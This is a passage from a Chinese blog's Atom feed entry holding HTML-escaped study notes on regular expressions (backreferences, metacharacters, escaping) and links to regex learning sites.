&lt;p&gt;则可以使用正则表达式 &lt;code&gt;-(\d{1,})\.(.*)\d&lt;/code&gt; 来匹配。然后使用 &lt;code&gt;\1、\2&lt;/code&gt; 来替换。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;向后引用： 在同样的表达式中引用同一个捕获组。&lt;ul&gt;
&lt;li&gt;表达式 &lt;code&gt;(xi)\1(ha)\2&lt;/code&gt;  能匹配 &lt;code&gt;xixihaha&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;元字符列表：&lt;code&gt;. \ [ ] { } ? * + | ( ) ^ $&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;字符类中使用到元字符列表：&lt;code&gt;[ ] \ - ^&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;你总是可以使用反斜杆对元字符进行转义：&lt;code&gt;\&lt;/code&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;参考资料：&quot;&gt;&lt;a href=&quot;#参考资料：&quot; class=&quot;headerlink&quot; title=&quot;参考资料：&quot;&gt;&lt;/a&gt;参考资料：&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://www.regexr.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;RegExr&lt;/a&gt;：一款在线学习、构建和测试正则表达式的工具&lt;br&gt;&lt;a href=&quot;http://tryregex.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;TRY REGEX&lt;/a&gt;：交互式正则表达式的教学网站&lt;br&gt;&lt;a href=&quot;http://doslin.com/learn-regular-expressions-in-about-55-minutes/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;55分钟学会正则表达式&lt;/a&gt;：很好的入门文章&lt;/p&gt;
</content>
    
    <summary type="html">
    
      最近在看鸟哥 Linux，看到正则表达式这块，以前看到这些恐怖的字符总是觉得恶心，今天就咬牙系统的学习了下正则表达式。然后有了这篇笔记。主要总结正则表达式的一些关键知识点。
    
    </summary>
    
      <category term="编程语言" scheme="http://wuchong.me/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="正则表达式" scheme="http://wuchong.me/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
</feed>
